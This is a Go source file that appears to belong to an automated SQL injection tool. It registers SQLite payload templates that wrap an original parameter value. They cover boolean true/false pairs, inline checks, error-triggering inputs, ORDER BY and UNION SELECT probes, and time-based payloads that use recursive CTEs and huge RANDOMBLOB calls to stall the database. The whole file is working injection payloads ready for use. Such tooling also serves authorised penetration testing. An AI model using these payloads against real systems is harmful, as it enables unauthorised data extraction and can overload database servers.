package dbms

func init() {
	register(&Payloads{
		Name: SQLite,
		Boolean: []BoolPair{
			{True: "{orig} AND 1=1", False: "{orig} AND 1=2"},
			{True: "{orig} AND 1=1-- -", False: "{orig} AND 1=2-- -"},
			{True: "{orig}' AND '1'='1", False: "{orig}' AND '1'='2"},
			{True: "{orig}' AND 'a'='a'-- -", False: "{orig}' AND 'a'='b'-- -"},
			{True: "{orig} AND sqlite_version()=sqlite_version()", False: "{orig} AND sqlite_version()!=sqlite_version()"},
			{True: "{orig} AND (SELECT sqlite_version())=(SELECT sqlite_version())", False: "{orig} AND (SELECT sqlite_version())!=(SELECT sqlite_version())"},
		},
		Inline: []BoolPair{
			{True: "{orig} AND (SELECT 8634)=8634", False: "{orig} AND (SELECT 8634)=8635"},
			{True: "{orig}' AND (SELECT 8634)=8634-- -", False: "{orig}' AND (SELECT 8634)=8635-- -"},
		},
		Time: []TimeTpl{
			{Payload: "{orig} AND (SELECT count(*) FROM (WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x<2000000000) SELECT x FROM c))=0-- -", Risk: 3},
			{Payload: "{orig} AND (SELECT CASE WHEN (1=1) THEN LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))) ELSE 1 END)-- -", Risk: 2},
			{Payload: "{orig} AND (SELECT CASE WHEN (1=1) THEN (SELECT count(*) FROM (WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x<50000000) SELECT x FROM c)) ELSE 0 END)-- -", Risk: 2},
		},
		Error: []string{
			"{orig}' AND (SELECT randomblob(-100000000))-- -",
			"{orig}' AND (SELECT abs(-9223372036854775808))-- -",
			"{orig} AND (SELECT randomblob(-100000000))-- -",
			"{orig} AND 1=sqlite_version()-- -",
			"{orig}'",
		},
		Union: UnionTemplates{
			OrderBy: []string{
				"{orig} ORDER BY {n}-- -",
			},
			UnionSelect: []string{
				"{orig} UNION SELECT {cols}-- -",
				"{orig} UNION ALL SELECT {cols}-- -",
			},
		},
		StackedOK: false,
	})
}
